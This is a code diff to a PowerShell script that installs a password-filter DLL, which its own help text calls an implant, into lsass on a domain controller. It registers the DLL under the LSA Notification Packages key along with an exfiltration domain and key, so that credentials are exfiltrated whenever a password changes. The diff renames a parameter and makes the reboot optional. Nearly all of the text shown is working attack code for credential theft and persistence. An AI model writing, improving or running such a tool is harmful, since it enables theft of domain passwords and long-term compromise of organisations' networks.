@@ -8,7 +8,7 @@ exfiltrates credentials when a password change occurs.
 Adds/Removes registry keys and values depending on the `Cleanup` switch. Restarts
 the computer so the DLL is loaded/unloaded into memory by the lsass process.
 
-.PARAMETER DomainValue
+.PARAMETER Domain
 The domain to where you want to exfiltrate the data.
 
 .PARAMETER Key
@@ -32,12 +32,16 @@ Path to the System32 folder.
 .SWITCH Cleanup
 Switch. Set value to True if the DLL and its associated registry keys are to be
 removed from the system.
+
+.SWITCH RebootNow
+Switch. Specifies whether to reboot the domain controller immediately after
+deploying the implant.
 #>
 
     [CmdletBinding()] Param(
     [Parameter(Position = 0, Mandatory = $True)]
     [String]
-    $DomainValue,
+    $Domain,
 
     [Parameter(Position = 1, Mandatory = $True)]
     [String]
@@ -53,7 +57,11 @@ removed from the system.
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Cleanup = $False
+    $Cleanup = $False,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [Switch]
+    $RebootNow = $False
     )
 
     $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
@@ -74,7 +82,7 @@ removed from the system.
         }
         Set-Content -Path $DLLPath"\"$DLLName".dll" -Value $Content -Encoding Byte
 
-        New-ItemProperty -Path $registryPath -Name $DomainName -Value $DomainValue -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $registryPath -Name $DomainName -Value $Domain -PropertyType String -Force | Out-Null
         New-ItemProperty -Path $registryPath -Name $KeyName -Value $KeyValue -PropertyType Binary -Force | Out-Null
         $notifPackagesValues = (Get-ItemProperty -Path $registryPath $NotificationPackagesName).$NotificationPackagesName
 
@@ -83,7 +91,9 @@ removed from the system.
             Set-ItemProperty $registryPath $NotificationPackagesName -value $notifPackagesValues -Type MultiString
         }
 
-        Restart-Computer
+        if ($RebootNow -eq $True) {
+            Restart-Computer
+        }
     } else {
         $notifPackagesValues = (Get-ItemProperty -Path $registryPath $NotificationPackagesName).$NotificationPackagesName
         if($notifPackagesValues -contains $DLLName){
@@ -95,6 +105,9 @@ removed from the system.
 
         Remove-ItemProperty -Path $registryPath -Name $DomainName -ErrorAction SilentlyContinue
         Remove-ItemProperty -Path $registryPath -Name $KeyName -ErrorAction SilentlyContinue
-        Restart-Computer
+
+        if ($RebootNow -eq $True) {
+            Restart-Computer
+        }
     }
 }
